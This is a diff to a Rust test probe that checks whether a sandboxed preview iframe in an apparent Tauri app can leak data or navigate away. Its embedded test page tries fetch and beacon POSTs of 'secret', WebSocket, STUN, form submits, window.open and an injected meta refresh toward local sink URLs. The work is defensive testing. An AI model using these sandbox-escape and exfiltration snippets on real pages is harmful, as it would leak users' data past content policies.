@@ -29,12 +29,18 @@
 //!    navigation it can: `top.location`, self-navigation, link clicks with
 //!    each target, an SVG link, an image-map area, `window.open`, a form
 //!    submit, a frame it creates and a meta refresh it inserts, plus `fetch`,
-//!    `sendBeacon`, a WebSocket and an image. Asserted: none reaches a sink,
-//!    every link click reaches the app as a request to open, and the app page
-//!    never navigates. The channels ADR-043 accepts for an opted-in file are
-//!    reported, not asserted: STUN, a resource hint the script creates, and on
-//!    WebView2 the frame navigations the script starts, whose target the
-//!    browser layer connects to before `frame-src` refuses them.
+//!    `sendBeacon`, a WebSocket and an image. The attempts that leave the
+//!    document in its frame share one load of it; each attempt that can move
+//!    the frame itself (the form submit, the inserted refresh, the link
+//!    without a target, `location.href`) gets a load of its own, so an engine
+//!    that moves the frame still sees every attempt. Each load is held for the
+//!    settle time before the next one replaces it. Asserted: every load
+//!    reports in, every attempt is made, none reaches a sink, every link click
+//!    reaches the app as a request to open, and the app page never navigates.
+//!    The channels ADR-043 accepts for an opted-in file are reported, not
+//!    asserted: STUN, a resource hint the script creates, and on WebView2 the
+//!    frame navigations the script starts, whose target the browser layer
+//!    connects to before `frame-src` refuses them.
 //! 3. **Controls.** The same iframe, at the same origin and under the same
 //!    sandbox, loads a document served without the policy, which fires an
 //!    image, a preconnect and STUN at fresh sinks. The image has to land, or
@@ -42,6 +48,9 @@
 //!    their silence above proves nothing; the other two report whether the
 //!    engine acts on them. A page with no policy at `about:blank` fires the
 //!    same three, which tells a broken frame apart from unreachable sinks.
+//!
+//! The probe prints one block per phase, every vector in it with its verdict,
+//! on a pass as on a failure; a failure lists the verdicts that failed first.
 //!
 //! On Windows the probe turns off Chromium's private and local network checks.
 //! They stop a public page reaching a loopback address, so they would stop the
@@ -80,14 +89,17 @@ const LOAD_TIMEOUT: Duration = Duration::from_secs(20);
 /// Given to each phase once its document is in, for what it set off (a meta
 /// refresh, a preconnect, STUN gathering) to reach a sink.
 const SETTLE: Duration = Duration::from_secs(3);
-/// The gap between two scripts-on attempts. The probe paces them itself: a
-/// hidden window's page timers are throttled, more the longer it is hidden.
+/// The gap between two scripts-on attempts in one load. The probe paces them
+/// itself: a hidden window's page timers are throttled, more the longer it is
+/// hidden.
 const STEP_GAP: Duration = Duration::from_millis(300);
-/// More attempts than the scripts-on corpus holds; reaching it means the
-/// document stopped answering.
-const MAX_STEPS: usize = 64;
+/// How long a settled scripts-on load has to answer the probe's ping before
+/// the probe records that the frame left the document.
+const PING_WAIT: Duration = Duration::from_secs(1);
 /// How often the event loop wakes to read what the page reported.
 const POLL: Duration = Duration::from_millis(100);
+/// The longest refused URL the output prints whole.
+const URL_SHOWN: usize = 120;
 
 /// Static vectors in the scripts-off corpus, one sink each.
 const OFF_VECTORS: &[&str] = &[
@@ -162,6 +174,33 @@ const ON_RESIDUAL: &[&str] = &["dynamic-preconnect"];
 /// `frame-src` refuses it, a channel ADR-043 accepts for an opted-in file, so
 /// on Windows these are reported; on WebKit they are asserted.
 const ON_FRAME_NAVIGATIONS: &[&str] = &["script-iframe", "meta-refresh-inserted", "self-location"];
+
+/// The loads of the scripts-on document and the attempts each one makes, in
+/// order. The attempts that leave the document in its frame share the first
+/// load. Each attempt that can move the frame itself has a load of its own, so
+/// an engine that moves the frame cannot keep the attempts after it from
+/// being made.
+const ON_LOADS: &[&[&str]] = &[
+    &[
+        "fetch",
+        "beacon",
+        "websocket",
+        "script-img",
+        "stun",
+        "dynamic-preconnect",
+        "top-location",
+        "link-top",
+        "link-blank",
+        "svg-link",
+        "area",
+        "window-open",
+        "script-iframe",
+    ],
+    &["form-submit"],
+    &["meta-refresh-inserted"],
+    &["link-self"],
+    &["self-location"],
+];
 
 const CONTROL_VECTORS: &[&str] = &[
     "control-frame-img",
@@ -525,56 +564,64 @@ fn on_corpus(sinks: &Sinks) -> String {
 <map name="m"><area id="area" shape="rect" coords="0,0,1,1" href="{area}" target="_blank"></map>
 <form id="form" action="{form_submit}" method="post"><input name="d" value="secret"></form>
 <script>
-parent.postMessage({{ probe: "inline-ran" }}, "*");
+var thisLoad = new URLSearchParams(location.search).get("load");
+parent.postMessage({{ probe: "inline-ran", load: thisLoad }}, "*");
 function click(id) {{
   document.getElementById(id).dispatchEvent(new MouseEvent("click", {{ bubbles: true, cancelable: true }}));
 }}
-var steps = [
-  ["fetch", function () {{ fetch("{fetch}", {{ method: "POST", body: "secret" }}).catch(function () {{}}); }}],
-  ["beacon", function () {{ navigator.sendBeacon("{beacon}", "secret"); }}],
-  ["websocket", function () {{ new WebSocket("{websocket}".replace("http:", "ws:")); }}],
-  ["script-img", function () {{ new Image().src = "{script_img}"; }}],
-  ["stun", function () {{
+var steps = {{
+  "fetch": function () {{ fetch("{fetch}", {{ method: "POST", body: "secret" }}).catch(function () {{}}); }},
+  "beacon": function () {{ navigator.sendBeacon("{beacon}", "secret"); }},
+  "websocket": function () {{ new WebSocket("{websocket}".replace("http:", "ws:")); }},
+  "script-img": function () {{ new Image().src = "{script_img}"; }},
+  "stun": function () {{
     var pc = new RTCPeerConnection({{ iceServers: [{{ urls: "stun:127.0.0.1:{stun}" }}] }});
     pc.createDataChannel("x");
     pc.createOffer().then(function (o) {{ return pc.setLocalDescription(o); }}).catch(function () {{}});
-  }}],
-  ["dynamic-preconnect", function () {{
+  }},
+  "dynamic-preconnect": function () {{
     var hint = document.createElement("link");
     hint.rel = "preconnect";
     hint.href = "{dynamic_preconnect}";
     document.head.appendChild(hint);
-  }}],
-  ["top-location", function () {{ top.location = "{top_location}"; }}],
-  ["link-top", function () {{ click("link-top"); }}],
-  ["link-blank", function () {{ click("link-blank"); }}],
-  ["svg-link", function () {{ click("svg-link"); }}],
-  ["area", function () {{ click("area"); }}],
-  ["window-open", function () {{ window.open("{window_open}"); }}],
-  ["form-submit", function () {{ document.getElementById("form").submit(); }}],
-  ["script-iframe", function () {{
+  }},
+  "top-location": function () {{ top.location = "{top_location}"; }},
+  "link-top": function () {{ click("link-top"); }},
+  "link-blank": function () {{ click("link-blank"); }},
+  "svg-link": function () {{ click("svg-link"); }},
+  "area": function () {{ click("area"); }},
+  "window-open": function () {{ window.open("{window_open}"); }},
+  "form-submit": function () {{ document.getElementById("form").submit(); }},
+  "script-iframe": function () {{
     var frame = document.createElement("iframe");
     frame.src = "{script_iframe}";
     document.body.appendChild(frame);
-  }}],
-  ["meta-refresh-inserted", function () {{
+  }},
+  "meta-refresh-inserted": function () {{
     var refresh = document.createElement("meta");
     refresh.httpEquiv = "refresh";
     refresh.content = "0;url={meta_refresh_inserted}";
     document.head.appendChild(refresh);
-  }}],
-  ["link-self", function () {{ click("link-self"); }}],
-  ["self-location", function () {{ location.href = "{self_location}"; }}]
-];
+  }},
+  "link-self": function () {{ click("link-self"); }},
+  "self-location": function () {{ location.href = "{self_location}"; }}
+}};
+window.addEventListener("load", function () {{
+  parent.postMessage({{ probe: "load-ready", load: thisLoad }}, "*");
+}});
 window.addEventListener("message", function (event) {{
   var data = event.data || {{}};
-  if (data.probe !== "step" || typeof data.index !== "number") return;
-  if (data.index >= steps.length) {{
-    parent.postMessage({{ probe: "attempts-done" }}, "*");
+  if (data.probe === "ping") {{
+    parent.postMessage({{ probe: "pong", load: thisLoad }}, "*");
     return;
   }}
-  parent.postMessage({{ probe: "attempt", vector: steps[data.index][0] }}, "*");
-  try {{ steps[data.index][1](); }} catch (e) {{}}
+  if (data.probe !== "step" || typeof data.vector !== "string") return;
+  if (!Object.prototype.hasOwnProperty.call(steps, data.vector)) {{
+    parent.postMessage({{ probe: "unknown-step", vector: data.vector, load: thisLoad }}, "*");
+    return;
+  }}
+  parent.postMessage({{ probe: "attempt", vector: data.vector, load: thisLoad }}, "*");
+  try {{ steps[data.vector](); }} catch (e) {{}}
 }});
 </script>
 </body></html>
@@ -666,8 +713,9 @@ try {{
 
 /// The page the app origin serves: the preview iframe as `PreviewPane` builds
 /// it, on the scripts-off document, and a script that relays what the frame
-/// posts to the probe and moves the frame to the scripts-on document when the
-/// probe asks.
+/// posts to the probe and, when the probe asks, loads the scripts-on document
+/// in the frame again, passes the frame an attempt to make or a ping, and
+/// moves the frame to the control.
 fn parent_page(sandbox: &str, off_src: &str) -> String {
     format!(
         "<!doctype html><html><head><meta charset=\"utf-8\"><script src=\"/parent.js\"></script></head>\
@@ -688,20 +736,25 @@ fn parent_script(on_src: &str, control_src: &str) -> String {
       probe: data.probe || null,
       type: data.type || null,
       href: data.href || null,
-      vector: data.vector || null
+      vector: data.vector || null,
+      load: typeof data.load === "string" ? data.load : null
     }});
   }});
+  function frame() {{ return document.getElementById("preview"); }}
   window.__writProbe = {{
-    scriptsOn: function () {{
+    scriptsOn: function (load) {{
       phase = "on";
-      document.getElementById("preview").src = "{on_src}";
+      frame().src = "{on_src}&load=" + load;
     }},
-    step: function (index) {{
-      document.getElementById("preview").contentWindow.postMessage({{ probe: "step", index: index }}, "*");
+    step: function (vector) {{
+      frame().contentWindow.postMessage({{ probe: "step", vector: vector }}, "*");
+    }},
+    ping: function () {{
+      frame().contentWindow.postMessage({{ probe: "ping" }}, "*");
     }},
     control: function () {{
       phase = "control";
-      document.getElementById("preview").src = "{control_src}";
+      frame().src = "{control_src}";
     }},
     report: function () {{ send({{ kind: "final", href: location.href }}); }}
   }};
@@ -717,6 +770,8 @@ struct FrameMessage {
     kind: Option<String>,
     href: Option<String>,
     vector: Option<String>,
+    /// The scripts-on load that posted it, read from that load's URL.
+    load: Option<usize>,
 }
 
 /// What the app page relayed over IPC.
@@ -736,10 +791,26 @@ impl Reports {
         })
     }
 
-    fn attempted(&self, vector: &str) -> bool {
+    fn load_has(&self, load: usize, probe: &str) -> bool {
         self.frame
             .iter()
-            .any(|m| m.probe.as_deref() == Some("attempt") && m.vector.as_deref() == Some(vector))
+            .any(|m| m.load == Some(load) && m.probe.as_deref() == Some(probe))
+    }
+
+    fn attempt(&self, vector: &str) -> Option<&FrameMessage> {
+        self.frame
+            .iter()
+            .find(|m| m.probe.as_deref() == Some("attempt") && m.vector.as_deref() == Some(vector))
+    }
+
+    /// Attempts the probe asked for that the scripts-on document has no step
+    /// for.
+    fn unknown_steps(&self) -> Vec<&str> {
+        self.frame
+            .iter()
+            .filter(|m| m.probe.as_deref() == Some("unknown-step"))
+            .filter_map(|m| m.vector.as_deref())
+            .collect()
     }
 
     fn opened(&self, href: &str) -> bool {
@@ -762,6 +833,7 @@ fn record_report(reports: &Mutex<Reports>, body: &str) {
             kind: text("type"),
             href: text("href"),
             vector: text("vector"),
+            load: text("load").and_then(|load| load.parse().ok()),
         }),
         Some("final") => reports.final_href = text("href"),
         _ => {}
@@ -772,15 +844,64 @@ fn record_report(reports: &Mutex<Reports>, body: &str) {
 /// probe's own clock, never on a timer inside the page: a hidden window's page
 /// timers are throttled.
 enum Stage {
-    AwaitOffReady { deadline: Instant },
-    OffSettle { until: Instant },
-    AwaitOnScript { deadline: Instant },
-    Attempt { index: usize, at: Instant },
-    OnSettle { until: Instant },
-    AwaitControl { deadline: Instant },
-    ControlSettle { until: Instant },
-    Report { until: Instant },
-    BlankControl { until: Instant },
+    AwaitOffReady {
+        deadline: Instant,
+    },
+    OffSettle {
+        until: Instant,
+    },
+    AwaitLoad {
+        load: usize,
+        deadline: Instant,
+    },
+    Attempt {
+        load: usize,
+        step: usize,
+        at: Instant,
+    },
+    LoadSettle {
+        load: usize,
+        until: Instant,
+    },
+    AwaitPong {
+        load: usize,
+        deadline: Instant,
+    },
+    AwaitControl {
+        deadline: Instant,
+    },
+    ControlSettle {
+        until: Instant,
+    },
+    Report {
+        until: Instant,
+    },
+    BlankControl {
+        until: Instant,
+    },
+}
+
+/// Every scripts-on vector is attempted in exactly one load.
+fn check_on_loads() -> Result<(), String> {
+    let mut planned: Vec<&str> = ON_LOADS
+        .iter()
+        .flat_map(|load| load.iter().copied())
+        .collect();
+    let mut vectors: Vec<&str> = ON_VECTORS
+        .iter()
+        .chain(ON_RESIDUAL)
+        .copied()
+        .chain(["stun"])
+        .collect();
+    planned.sort_unstable();
+    vectors.sort_unstable();
+    if planned == vectors {
+        Ok(())
+    } else {
+        Err(format!(
+            "the scripts-on loads attempt {planned:?}; they have to attempt each of {vectors:?} once"
+        ))
+    }
 }
 
 fn run() -> Result<String, String> {
@@ -789,6 +910,7 @@ fn run() -> Result<String, String> {
     use tao::window::WindowBuilder;
     use wry::WebViewBuilder;
 
+    check_on_loads()?;
     let windows = cfg!(target_os = "windows");
     let sinks = open_sinks()?;
 
@@ -835,7 +957,9 @@ fn run() -> Result<String, String> {
     );
 
     let reports = Arc::new(Mutex::new(Reports::default()));
-    let refused = Arc::new(Mutex::new(Vec::<String>::new()));
+    // What the guard refused, each with the part of the run it refused it in.
+    let refused = Arc::new(Mutex::new(Vec::<(String, String)>::new()));
+    let moment = Arc::new(Mutex::new("scripts off".to_string()));
 
     let mut event_loop = EventLoopBuilder::new().build();
     #[cfg(target_os = "macos")]
@@ -858,6 +982,7 @@ fn run() -> Result<String, String> {
     let preview_cache = cache.clone();
     let ipc_reports = reports.clone();
     let nav_refused = refused.clone();
+    let nav_moment = moment.clone();
     let builder = WebViewBuilder::new()
         .with_custom_protocol("tauri".to_string(), move |_id, request| {
             let (status, content_type, body): (u16, &str, Vec<u8>) = match request.uri().path() {
@@ -904,7 +1029,8 @@ fn run() -> Result<String, String> {
         .with_navigation_handler(move |url| {
             let allowed = writ_tauri_lib::navigation::is_allowed_navigation(&url, None);
             if !allowed {
-                nav_refused.lock().expect("refused").push(url);
+                let moment = nav_moment.lock().expect("moment").clone();
+                nav_refused.lock().expect("refused").push((moment, url));
             }
             allowed
         })
@@ -939,15 +1065,20 @@ fn run() -> Result<String, String> {
     let mut run_failures: Vec<String> = Vec::new();
     event_loop.run_return(|_event, _, control_flow| {
         let now = Instant::now();
-        let (off_ready, on_script, attempts_done, control_ran) = {
+        let current_load = match stage {
+            Stage::AwaitLoad { load, .. } | Stage::AwaitPong { load, .. } => Some(load),
+            _ => None,
+        };
+        let (off_ready, load_ready, load_answered, control_ran) = {
             let reports = reports.lock().expect("reports");
             (
                 reports.has("off", None, Some("ready")),
-                reports.has("on", Some("inline-ran"), None),
-                reports.has("on", Some("attempts-done"), None),
+                current_load.is_some_and(|load| reports.load_has(load, "load-ready")),
+                current_load.is_some_and(|load| reports.load_has(load, "pong")),
                 reports.has("control", Some("control-ran"), None),
             )
         };
+        let set_moment = |what: String| *moment.lock().expect("moment") = what;
         let mut script = |js: &str, what: &str| {
             if let Err(e) = webview.evaluate_script(js) {
                 run_failures.push(format!("could not {what}: {e}"));
@@ -960,40 +1091,75 @@ fn run() -> Result<String, String> {
                 })
             }
             Stage::OffSettle { until } if now >= until => {
+                set_moment("scripts on, load 0".to_string());
                 script(
-                    "window.__writProbe.scriptsOn()",
-                    "move the frame to scripts on",
+                    "window.__writProbe.scriptsOn(0)",
+                    "load the scripts-on document",
                 );
-                Some(Stage::AwaitOnScript {
+                Some(Stage::AwaitLoad {
+                    load: 0,
                     deadline: now + LOAD_TIMEOUT,
                 })
             }
-            Stage::AwaitOnScript { deadline } if on_script || now >= deadline => {
-                Some(Stage::Attempt { index: 0, at: now })
+            Stage::AwaitLoad { load, deadline } if load_ready || now >= deadline => {
+                Some(Stage::Attempt {
+                    load,
+                    step: 0,
+                    at: now,
+                })
             }
-            Stage::Attempt { index, .. } if attempts_done || index > MAX_STEPS => {
-                Some(Stage::OnSettle {
+            Stage::Attempt { load, step, .. } if step >= ON_LOADS[load].len() => {
+                Some(Stage::LoadSettle {
+                    load,
                     until: now + SETTLE,
                 })
             }
-            Stage::Attempt { index, at } if now >= at => {
+            Stage::Attempt { load, step, at } if now >= at => {
                 script(
-                    &format!("window.__writProbe.step({index})"),
+                    &format!(
+                        "window.__writProbe.step({})",
+                        serde_json::Value::from(ON_LOADS[load][step])
+                    ),
                     "send the frame its next attempt",
                 );
                 Some(Stage::Attempt {
-                    index: index + 1,
+                    load,
+                    step: step + 1,
                     at: now + STEP_GAP,
                 })
             }
-            Stage::OnSettle { until } if now >= until => {
+            Stage::LoadSettle { load, until } if now >= until => {
                 script(
-                    "window.__writProbe.control()",
-                    "move the frame to the control",
+                    "window.__writProbe.ping()",
+                    "ask the frame whether the document is still in it",
                 );
-                Some(Stage::AwaitControl {
-                    deadline: now + LOAD_TIMEOUT,
+                Some(Stage::AwaitPong {
+                    load,
+                    deadline: now + PING_WAIT,
                 })
+            }
+            Stage::AwaitPong { load, deadline } if load_answered || now >= deadline => {
+                let next_load = load + 1;
+                if next_load < ON_LOADS.len() {
+                    set_moment(format!("scripts on, load {next_load}"));
+                    script(
+                        &format!("window.__writProbe.scriptsOn({next_load})"),
+                        "load the scripts-on document again",
+                    );
+                    Some(Stage::AwaitLoad {
+                        load: next_load,
+                        deadline: now + LOAD_TIMEOUT,
+                    })
+                } else {
+                    set_moment("the in-frame control".to_string());
+                    script(
+                        "window.__writProbe.control()",
+                        "move the frame to the control",
+                    );
+                    Some(Stage::AwaitControl {
+                        deadline: now + LOAD_TIMEOUT,
+                    })
+                }
             }
             Stage::AwaitControl { deadline } if control_ran || now >= deadline => {
                 Some(Stage::ControlSettle {
@@ -1010,6 +1176,7 @@ fn run() -> Result<String, String> {
                 })
             }
             Stage::Report { until } if now >= until => {
+                set_moment("the about:blank control".to_string());
                 if let Err(e) = webview.load_html(&control_html) {
                     run_failures.push(format!("the control page did not load: {e}"));
                 }
@@ -1034,166 +1201,334 @@ fn run() -> Result<String, String> {
     evaluate(&sinks, &reports, &refused, run_failures)
 }
 
+/// How a verdict reads in the output: `ok` held as asserted, `FAIL` did not,
+/// `info` is reported and not asserted.
+#[derive(Clone, Copy, PartialEq, Eq)]
+enum Mark {
+    Ok,
+    Fail,
+    Info,
+}
+
+/// One part of the run and the verdict on each thing it checked, printed as
+/// one block.
+struct Block {
+    name: &'static str,
+    about: String,
+    rows: Vec<(Mark, String, String)>,
+}
+
+impl Block {
+    fn new(name: &'static str, about: impl Into<String>) -> Self {
+        Block {
+            name,
+            about: about.into(),
+            rows: Vec::new(),
+        }
+    }
+
+    fn row(&mut self, mark: Mark, what: impl Into<String>, verdict: impl Into<String>) {
+        self.rows.push((mark, what.into(), verdict.into()));
+    }
+}
+
+/// The blocks as the probe prints them, in run order, after the verdicts that
+/// failed. `Ok` when none did.
+fn print_blocks(blocks: &[Block]) -> Result<String, String> {
+    let width = blocks
+        .iter()
+        .flat_map(|block| &block.rows)
+        .map(|(_, what, _)| what.chars().count())
+        .max()
+        .unwrap_or(0);
+    let mut failed = Vec::new();
+    let mut lines = Vec::new();
+    for block in blocks {
+        lines.push(format!("{}: {}", block.name, block.about));
+        for (mark, what, verdict) in &block.rows {
+            let label = match mark {
+                Mark::Ok => "ok",
+                Mark::Fail => "FAIL",
+                Mark::Info => "info",
+            };
+            lines.push(format!("  {label:<4}  {what:<width$}  {verdict}"));
+            if *mark == Mark::Fail {
+                failed.push(format!("  {}: {what}: {verdict}", block.name));
+            }
+        }
+    }
+    if failed.is_empty() {
+        Ok(lines.join("\n"))
+    } else {
+        Err(format!(
+            "failed ({}):\n{}\n{}",
+            failed.len(),
+            failed.join("\n"),
+            lines.join("\n")
+        ))
+    }
+}
+
+fn shorten(url: &str) -> String {
+    if url.chars().count() <= URL_SHOWN {
+        url.to_string()
+    } else {
+        format!("{}...", url.chars().take(URL_SHOWN).collect::<String>())
+    }
+}
+
 fn evaluate(
     sinks: &Sinks,
     reports: &Reports,
-    refused: &[String],
-    mut failures: Vec<String>,
+    refused: &[(String, String)],
+    run_failures: Vec<String>,
 ) -> Result<String, String> {
-    let mut lines = Vec::new();
+    let reached = |vector: &str| match sinks.hits(vector) {
+        0 => "did not reach its sink".to_string(),
+        hits => format!("reached its sink ({hits})"),
+    };
+    let mut blocks = Vec::new();
+
+    if !run_failures.is_empty() {
+        let mut run = Block::new("run", "the probe could not drive the page");
+        for failure in run_failures {
+            run.row(Mark::Fail, "page script", failure);
+        }
+        blocks.push(run);
+    }
 
     // Controls first: without them a silent sink proves nothing.
-    let reached = |vector: &str| {
-        if sinks.hits(vector) > 0 {
-            "reached its sink"
+    let mut controls = Block::new(
+        "controls",
+        "the preview frame serving a document without the policy, then a page at about:blank",
+    );
+    if sinks.hits("control-frame-img") > 0 {
+        controls.row(Mark::Ok, "in-frame image", reached("control-frame-img"));
+    } else {
+        controls.row(
+            Mark::Fail,
+            "in-frame image",
+            "did not reach its sink, so something other than the policy keeps this engine \
+             from the sinks and their silence proves nothing",
+        );
+    }
+    controls.row(
+        Mark::Info,
+        "in-frame script",
+        if reports.has("control", Some("control-ran"), None) {
+            "ran"
         } else {
-            "did not reach its sink"
-        }
-    };
-    if sinks.hits("control-frame-img") == 0 {
-        failures.push(format!(
-            "control: an image in the preview frame, served without the policy, never reached \
-             its sink (the same image on a page at about:blank {}), so something other than the \
-             policy keeps this engine from the sinks and their silence proves nothing",
-            reached("control-img")
-        ));
-    }
-    if !reports.has("control", Some("control-ran"), None) {
-        lines.push("control: the in-frame control's script did not run".to_string());
-    }
+            "did not run"
+        },
+    );
     for (vector, what) in [
-        ("control-frame-img", "in-frame image"),
         ("control-frame-preconnect", "in-frame preconnect"),
         ("control-frame-stun", "in-frame STUN"),
         ("control-img", "about:blank image"),
         ("control-preconnect", "about:blank preconnect"),
         ("control-stun", "about:blank STUN"),
     ] {
-        lines.push(format!("control: {what}: {}", reached(vector)));
+        controls.row(Mark::Info, what, reached(vector));
     }
+    blocks.push(controls);
 
-    if let Some(dns) = &sinks.dns {
-        let names = dns.queried();
-        let ours = format!(".{}.{}", dns.nonce, dns.domain);
-        let leaked: Vec<&String> = names
-            .iter()
-            .filter(|name| name.ends_with(&ours))
-            .filter(|name| {
-                ![
-                    dns.name("control"),
-                    dns.name("control-img"),
-                    dns.name("control-frame-img"),
-                ]
-                .contains(*name)
-            })
-            .collect();
-        if !leaked.is_empty() {
-            failures.push(format!(
-                "scripts off: names reached the DNS sink: {leaked:?}"
-            ));
-        }
-        if !names.contains(&dns.name("control-frame-img")) {
-            failures.push(
-                "dns: the in-frame control's image name never reached the DNS sink, so this \
-                 engine does not resolve through it and the DNS check proves nothing"
-                    .to_string(),
+    let off_names = match &sinks.dns {
+        Some(dns) => {
+            let names = dns.queried();
+            let looked_up = |label: &str| names.contains(&dns.name(label));
+            let mut block = Block::new(
+                "dns",
+                format!(
+                    "{} routed to the DNS sink, which saw the probe's own lookup",
+                    dns.domain
+                ),
             );
-        }
-        lines.push(format!(
-            "dns: routed and checked; the about:blank control's image name {}",
-            if names.contains(&dns.name("control-img")) {
-                "was looked up"
+            if looked_up("control-frame-img") {
+                block.row(Mark::Ok, "in-frame image name", "looked up");
             } else {
-                "was not looked up"
+                block.row(
+                    Mark::Fail,
+                    "in-frame image name",
+                    "never reached the DNS sink, so this engine does not resolve through it \
+                     and the DNS check proves nothing",
+                );
             }
-        ));
-    } else {
-        lines.push(
-            "dns: not routed on this run (set WRIT_ENGINE_PROBE_DNS_DOMAIN and _ADDR)".to_string(),
-        );
-    }
+            block.row(
+                Mark::Info,
+                "about:blank image name",
+                if looked_up("control-img") {
+                    "looked up"
+                } else {
+                    "not looked up"
+                },
+            );
+            blocks.push(block);
+            let ours = format!(".{}.{}", dns.nonce, dns.domain);
+            let controls = [
+                dns.name("control"),
+                dns.name("control-img"),
+                dns.name("control-frame-img"),
+            ];
+            Some(
+                names
+                    .into_iter()
+                    .filter(|name| name.ends_with(&ours) && !controls.contains(name))
+                    .collect::<Vec<_>>(),
+            )
+        }
+        None => {
+            blocks.push(Block::new(
+                "dns",
+                "not routed on this run (set WRIT_ENGINE_PROBE_DNS_DOMAIN and _ADDR)",
+            ));
+            None
+        }
+    };
 
-    // Phase 1: scripts off.
-    if !reports.has("off", None, Some("ready")) {
-        failures.push(
-            "scripts off: the bridge never reported ready, so the document did not render \
-             under the shipped policy"
-                .to_string(),
+    let mut off = Block::new(
+        "scripts off",
+        "every document's default, one load of a document holding every static vector",
+    );
+    if reports.has("off", None, Some("ready")) {
+        off.row(Mark::Ok, "bridge", "reported ready");
+    } else {
+        off.row(
+            Mark::Fail,
+            "bridge",
+            "never reported ready, so the document did not render under the shipped policy",
         );
     }
     if reports.has("off", Some("inline-ran"), None) {
-        failures.push("scripts off: the document's inline script ran".to_string());
+        off.row(Mark::Fail, "inline script", "ran");
+    } else {
+        off.row(Mark::Ok, "inline script", "did not run");
     }
     for vector in OFF_VECTORS {
-        let hits = sinks.hits(vector);
-        if hits > 0 {
-            failures.push(format!("scripts off: {vector} reached its sink ({hits})"));
-        }
+        let mark = if sinks.hits(vector) > 0 {
+            Mark::Fail
+        } else {
+            Mark::Ok
+        };
+        off.row(mark, *vector, reached(vector));
     }
+    match off_names {
+        Some(leaked) if leaked.is_empty() => {
+            off.row(Mark::Ok, "names", "none reached the DNS sink");
+        }
+        Some(leaked) => {
+            off.row(
+                Mark::Fail,
+                "names",
+                format!("reached the DNS sink: {}", leaked.join(", ")),
+            );
+        }
+        None => {}
+    }
+    blocks.push(off);
 
-    // Phase 2: scripts on.
-    if !reports.has("on", Some("inline-ran"), None) {
-        failures.push(
-            "scripts on: the document's script never ran, so no navigation was attempted"
-                .to_string(),
-        );
-    }
-    if !reports.has("on", Some("attempts-done"), None) {
-        failures.push(
-            "scripts on: the attempts never finished, so one of them took the frame away"
-                .to_string(),
-        );
-    }
-    let frame_navigations_reported = cfg!(target_os = "windows");
-    for vector in ON_VECTORS {
-        if !reports.attempted(vector) {
-            failures.push(format!("scripts on: {vector} was never attempted"));
-        }
-        let hits = sinks.hits(vector);
-        if frame_navigations_reported && ON_FRAME_NAVIGATIONS.contains(vector) {
-            lines.push(format!(
-                "scripts on, accepted for an opted-in file on WebView2: {vector}: {}",
-                if hits > 0 {
-                    "reached its sink"
-                } else {
-                    "did not reach its sink"
-                }
-            ));
-        } else if hits > 0 {
-            failures.push(format!("scripts on: {vector} reached its sink ({hits})"));
-        }
-    }
-    for click in ON_CLICKS {
-        if !reports.opened(&sinks.url(click)) {
-            failures.push(format!(
-                "scripts on: the {click} click never reached the app as a request to open"
-            ));
-        }
-    }
-    for vector in ON_RESIDUAL.iter().copied().chain(["stun"]) {
-        lines.push(format!(
-            "scripts on, accepted for an opted-in file: {vector}: {}",
-            if sinks.hits(vector) > 0 {
-                "reached its sink"
+    let webview2 = cfg!(target_os = "windows");
+    let mut on = Block::new(
+        "scripts on",
+        format!(
+            "a file the user opted in, in {} loads; each attempt that can move the frame has a \
+             load of its own",
+            ON_LOADS.len()
+        ),
+    );
+    for (load, vectors) in ON_LOADS.iter().enumerate() {
+        let what = format!("load {load}");
+        if reports.load_has(load, "load-ready") {
+            let after = if reports.load_has(load, "pong") {
+                "the document answered the ping after its attempts"
             } else {
-                "did not reach its sink"
+                "the frame had left the document by the ping after its attempts"
+            };
+            on.row(Mark::Ok, what, format!("reported in; {after}"));
+        } else if reports.load_has(load, "inline-ran") {
+            on.row(
+                Mark::Fail,
+                what,
+                "its script ran, but the document never reported in",
+            );
+        } else {
+            on.row(Mark::Fail, what, "never reported in: its script never ran");
+        }
+        for vector in vectors.iter().copied() {
+            let accepted = if vector == "stun" || ON_RESIDUAL.contains(&vector) {
+                Some("accepted for an opted-in file")
+            } else if webview2 && ON_FRAME_NAVIGATIONS.contains(&vector) {
+                Some("accepted for an opted-in file on WebView2")
+            } else {
+                None
+            };
+            let mut failed = false;
+            let mut verdict = Vec::new();
+            if reports.attempt(vector).is_some() {
+                verdict.push("attempted".to_string());
+            } else {
+                failed = true;
+                verdict.push("never attempted".to_string());
             }
-        ));
+            verdict.push(reached(vector));
+            match accepted {
+                Some(why) => verdict.push(why.to_string()),
+                None => failed |= sinks.hits(vector) > 0,
+            }
+            if ON_CLICKS.contains(&vector) {
+                if reports.opened(&sinks.url(vector)) {
+                    verdict.push("reached the app as a request to open".to_string());
+                } else {
+                    failed = true;
+                    verdict.push("never reached the app as a request to open".to_string());
+                }
+            }
+            let mark = if failed {
+                Mark::Fail
+            } else if accepted.is_some() {
+                Mark::Info
+            } else {
+                Mark::Ok
+            };
+            on.row(mark, vector, verdict.join("; "));
+        }
     }
+    for vector in reports.unknown_steps() {
+        on.row(
+            Mark::Fail,
+            vector,
+            "the scripts-on document has no attempt by that name",
+        );
+    }
+    blocks.push(on);
 
-    // The app page stayed where it was through both phases.
+    // The app page stayed where it was through every phase.
+    let mut app = Block::new("app page", "the top-level page and the navigation guard");
     match &reports.final_href {
         Some(href) if writ_tauri_lib::navigation::is_allowed_navigation(href, None) => {
-            lines.push(format!("app page: still {href} after both phases"));
+            app.row(
+                Mark::Ok,
+                "location",
+                format!("still {href} after every phase"),
+            );
         }
-        Some(href) => failures.push(format!("the app page navigated away, to {href}")),
-        None => failures.push("the app page did not answer at the end of the run".to_string()),
+        Some(href) => app.row(Mark::Fail, "location", format!("navigated away, to {href}")),
+        None => app.row(
+            Mark::Fail,
+            "location",
+            "did not answer at the end of the run",
+        ),
     }
-    lines.push(format!("the guard refused {} navigation(s)", refused.len()));
+    if refused.is_empty() {
+        app.row(Mark::Info, "guard", "refused nothing");
+    }
+    for (moment, url) in refused {
+        app.row(
+            Mark::Info,
+            "guard",
+            format!("refused {} during {moment}", shorten(url)),
+        );
+    }
+    blocks.push(app);
 
-    if failures.is_empty() {
-        Ok(lines.join("\n"))
-    } else {
-        Err([failures, lines].concat().join("\n"))
-    }
+    print_blocks(&blocks)
 }
